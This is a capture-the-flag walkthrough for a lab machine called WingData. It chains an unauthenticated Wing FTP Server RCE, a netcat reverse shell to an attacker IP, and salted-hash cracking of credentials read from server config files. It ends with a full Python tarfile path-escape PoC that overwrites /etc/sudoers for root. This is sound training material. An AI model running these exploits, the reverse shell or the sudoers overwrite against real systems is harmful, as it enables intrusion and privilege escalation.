# WingData - Easy

```sh
sudo vim /etc/hosts
# add wingdata.htb

nmap -T4 -p- -A -Pn -v wingdata.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 9.2p1 Debian 2+deb12u7
    * 80/tcp - http - Apache httpd 2.4.66

* the webpage is a corporate page for Wing Data Solutions, a file sharing platform

* web enumeration:

    ```sh
    gobuster dir -u http://wingdata.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,md -t 25
    # dir scan

    ffuf -c -u 'http://wingdata.htb' -H 'Host: FUZZ.wingdata.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fw 21 -s
    # subdomain scan
    ```

* the subdomain scan gives a subdomain 'ftp.wingdata.htb' - update this entry in ```/etc/hosts``` file

* this subdomain is also mentioned in one of the hyperlinks provided in the website homepage, referred to as the client portal

* navigating to the subdomain leads us to a login page for Wing FTP Server Web Client v7.4.3

* trying default creds 'admin:admin' does not work in the login page

* Googling for exploits associated with Wing FTP Server 7.4.3 leads to [CVE-2025-47812](https://www.exploit-db.com/exploits/52347) - an unauthenticated RCE vuln

* we can try running the exploit:

    ```sh
    python3 52347.py

    python3 52347.py -u http://ftp.wingdata.htb -c whoami
    # RCE works
    # output is 'wingftp'

    # we can use this to get reverse shell using revsh one-liners

    nc -nvlp 4444
    # setup listener

    python3 52347.py -u http://ftp.wingdata.htb -c 'busybox nc 10.10.14.186 4444 -e sh'
    # this gives reverse shell
    ```

* in reverse shell:

    ```sh
    id
    # 'wingftp' user

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    pwd
    # '/opt/wftpserver'

    ls -la
    # enumerate files

    ls -la /opt
    # there is another folder 'backup_clients', but we cannot access it

    ls -la /home
    # there is one user 'wacky'
    # but no read access
    ```

* we have a user 'wacky' on the box, but we need to privesc to this user; we can check the Wing FTP Server install files for any secrets

* Googling shows that admin passwords are stored in the administrator directory for Wing FTP Server - we can check it:

    ```sh
    cd /opt/wftpserver

    ls -la Data

    ls -la Data/_ADMINISTRATOR

    cat Data/_ADMINISTRATOR/admins.xml
    # shows hash for 'admin'
    ```

* the 'admins.xml' file contains a hash for 'admin' user - the hash is a SHA256 hash

* we can try cracking this using ```hashcat```:

    ```sh
    # on attacker

    vim adminhash
    # paste the hash

    hashcat -a 0 -m 1400 adminhash /usr/share/wordlists/rockyou.txt
    # 1400 mode for sha2-256
    # we are unable to crack the hash
    ```

* as ```hashcat``` is unable to crack the hash, we need to continue our enumeration:

    ```sh
    cd /opt/wftpserver

    ls -la Data
    # check other folders

    ls -la Data/1

    cat Data/1/settings.xml
    # includes config '<SaltingString>WingFTP</SaltingString>'

    ls -la Data/1/users
    # this mentions multiple users and their XML files

    cat Data/1/users/*
    # output all files
    ```

* the 'Data' directory contains another sub-folder for other users on the FTP server - this includes users 'john', 'maria', 'steve' & 'wacky' ('anonymous' user also exists, but this was created by running the RCE exploit)

* the 'settings.xml' file in the 'Data' directory has the config for the users; this also mentions that salting is enabled for the password hashes, and mentions the salting string 'WingFTP'

* the XML files in the 'users' sub-folder include SHA256 hashes for each of these users, we can try to crack them using the salt

* for salted SHA256 hashes, we have possible modes 1410 & 1420 - we can try both:

    ```sh
    # on attacker
    
    vim userhashes
    # paste user hashes from the XML files and append the salt
    # each line should be in the format 'hash:WingFTP'

    hashcat -m 1410 userhashes /usr/share/wordlists/rockyou.txt
    # this works
    ```

* ```hashcat``` is able to crack the salted hash of user 'wacky' - this gives us the cleartext '!#7Blushing^*Bride5'

* we can now login as 'wacky':

    ```sh
    ssh wacky@wingdata.htb

    ls -la

    cat user.txt
    # user flag

    sudo -l
    ```

* ```sudo -l``` shows that we can run the command ```/usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *``` as root user

* we can check the script files:

    ```sh
    ls -la /opt/backup_clients/

    ls -la /opt/backup_clients/backups/
    # empty

    ls -la /opt/backup_clients/restored_backups/
    # empty

    cat /opt/backup_clients/restore_backup_clients.py
    ```

    ```py
    #!/usr/bin/env python3
    import tarfile
    import os
    import sys
    import re
    import argparse

    BACKUP_BASE_DIR = "/opt/backup_clients/backups"
    STAGING_BASE = "/opt/backup_clients/restored_backups"

    def validate_backup_name(filename):
        if not re.fullmatch(r"^backup_\d+\.tar$", filename):
            return False
        client_id = filename.split('_')[1].rstrip('.tar')
        return client_id.isdigit() and client_id != "0"

    def validate_restore_tag(tag):
        return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

    def main():
        parser = argparse.ArgumentParser(
            description="Restore client configuration from a validated backup tarball.",
            epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
        )
        parser.add_argument(
            "-b", "--backup",
            required=True,
            help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
                "where <client_id> is a positive integer, e.g., backup_1001.tar)"
        )
        parser.add_argument(
            "-r", "--restore-dir",
            required=True,
            help="Staging directory name for the restore operation. "
                "Must follow the format: restore_<client_user> (e.g., restore_john). "
                "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
        )

        args = parser.parse_args()

        if not validate_backup_name(args.backup):
            print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
            sys.exit(1)

        backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
        if not os.path.isfile(backup_path):
            print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
            sys.exit(1)

        if not args.restore_dir.startswith("restore_"):
            print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
            sys.exit(1)

        tag = args.restore_dir[8:]
        if not tag:
            print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
            sys.exit(1)

        if not validate_restore_tag(tag):
            print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
            sys.exit(1)

        staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
        print(f"[+] Backup: {args.backup}")
        print(f"[+] Staging directory: {staging_dir}")

        os.makedirs(staging_dir, exist_ok=True)

        try:
            with tarfile.open(backup_path, "r") as tar:
                tar.extractall(path=staging_dir, filter="data")
            print(f"[+] Extraction completed in {staging_dir}")
        except (tarfile.TarError, OSError, Exception) as e:
            print(f"[!] Error during extraction: {e}", file=sys.stderr)
            sys.exit(2)

    if __name__ == "__main__":
        main()
    ```

    * the script is used to restore a client backup tarball into a staging directory, with multiple protections against invalid filenames, path traversal, malicious restore directory names, missing files & unsafe extraction

    * the base directories are hardcoded for backups as ```/opt/backup_clients/backups``` & staging as ```/opt/backup_clients/restored_backups```

    * it checks if the backup filename is in format 'backup_<client_id>', where 'client_id' is an integer value - like 'backup_1001.tar' for example

    * the restore tag is validated to only have letters, digits, and underscore - and within 24 chars

    * the script takes 2 args - a backup file like 'backup_1001.tar' and a restore directory name like 'restore_john', where 'john' is the restore tag

    * it validates if the backup file exists on the system, and checks the argument for restore directory name starts with 'restore_' - following which it extracts & validates the tag

    * then, it builds the staging directory path as ```/opt/backup_clients/restored_backups/<restore_arg>```, where the restore directory arg is used

    * the ```tar``` command block extracts the files - it uses ```filter="data"```, which blocks device files, pipes, and other malicious elements in tar archives

* as the script is coded with guardrails, it is not possible to use the usual exploits for ```tar```

* also, for the script to work, the .tar file needs to be located in ```/opt/backup_clients/backups```, which is possible as we can copy our file to this directory - we have apt permissions

* Googling for exploits associated with 'tarfile filter data' leads to vulns like CVE-2025-4517, CVE-2025-4330 & CVE-2025-4138, which affect the ```tarfile``` module filters in Python 3.12 versions

* checking the Python version using ```/usr/local/bin/python3 --version``` shows we are on Python 3.12.3 - this is a vulnerable version

* Googling about the exploit gives us a [PoC for CVE-2025-4517, which can be used for arbitrary file writes](https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f)

* we can modify the original PoC to update the ```/etc/sudoers``` file to allow 'wacky' sudo access:

    ```py
    import tarfile
    import os
    import io
    import sys

    comp = 'd' * 247
    steps = "abcdefghijklmnop"
    path = ""
    with tarfile.open("poc.tar", mode="x") as tar:

        for i in steps:
            a = tarfile.TarInfo(os.path.join(path, comp))
            a.type = tarfile.DIRTYPE
            tar.addfile(a)
            b = tarfile.TarInfo(os.path.join(path, i))
            b.type = tarfile.SYMTYPE
            b.linkname = comp
            tar.addfile(b)
            path = os.path.join(path, comp)

        linkpath = os.path.join("/".join(steps), "l"*254)
        l = tarfile.TarInfo(linkpath)
        l.type = tarfile.SYMTYPE
        l.linkname = ("../" * len(steps))
        tar.addfile(l)

        e = tarfile.TarInfo("escape")
        e.type = tarfile.SYMTYPE
        e.linkname = linkpath + "/../../../../../etc"
        tar.addfile(e)

        f = tarfile.TarInfo("flaglink")
        f.type = tarfile.LNKTYPE
        f.linkname =  "escape/sudoers"
        tar.addfile(f)

        content = b"wacky ALL=(root) NOPASSWD: ALL\n"
        c = tarfile.TarInfo("flaglink")
        c.type = tarfile.REGTYPE
        c.size = len(content)
        tar.addfile(c, fileobj=io.BytesIO(content))
    ```

* after modifying the PoC to change the 'linkname' variables in order to modify ```/etc/sudoers``` to replace with the content ```wacky ALL=(root) NOPASSWD: ALL```, we can create the malicious .tar file and run the script:

    ```sh
    nano test.py
    # paste the modified script

    python3 test.py
    # create the .tar file

    cp poc.tar /opt/backup_clients/backups/backup_1010.tar

    sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1010.tar -r restore_testing
    # this works, and the extraction is successful

    sudo -l
    # the updated 'sudo' command shows, we can run all commands as root

    sudo su
    # we have root shell

    cat /root/root.txt
    # root flag
    ```
